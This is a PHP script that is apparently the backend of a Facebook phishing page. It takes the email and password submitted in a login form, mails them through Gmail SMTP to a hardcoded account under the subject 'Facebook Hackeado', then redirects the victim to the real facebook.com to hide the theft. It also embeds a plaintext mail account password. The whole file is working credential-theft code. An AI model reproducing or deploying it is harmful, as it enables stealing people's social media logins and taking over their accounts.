<?php

error_reporting(E_ALL ^ E_DEPRECATED);
header('Content-Type: text/html; Charset=UTF-8');

$email = isset($_POST['email']) ? $_POST['email'] : '';
$pass = isset($_POST['pass']) ? $_POST['pass'] : '';


use PHPMailer\PHPMailer\PHPMailer;

require 'phpMailer/PHPMailer.php';
require 'phpMailer/SMTP.php';

$mail = new PHPMailer(true);

$mail->CharSet = 'UTF-8';
$mail->isSMTP();
$mail->Host = 'smtp.gmail.com';
$mail->SMTPAuth = true;
$mail->Username = 'correopruebasutfv@gmail.com';
$mail->Password = '@123Pruebas';
$mail->SMTPSecure = 'tls';
$mail->Port = 587;

$mail->setFrom('correopruebasutfv@gmail.com');
$mail->addAddress('correopruebasutfv@gmail.com');

$mail->isHTML(true);
$mail->Subject = 'Facebook Hackeado';
$mail->Body = '
<p><b>Correo: </b> '.$email.'</p>
<p><b>Password: </b> '.$pass.'</p>
';

$mail->send();

echo'<script>window.location="https://www.facebook.com"</script>';

?>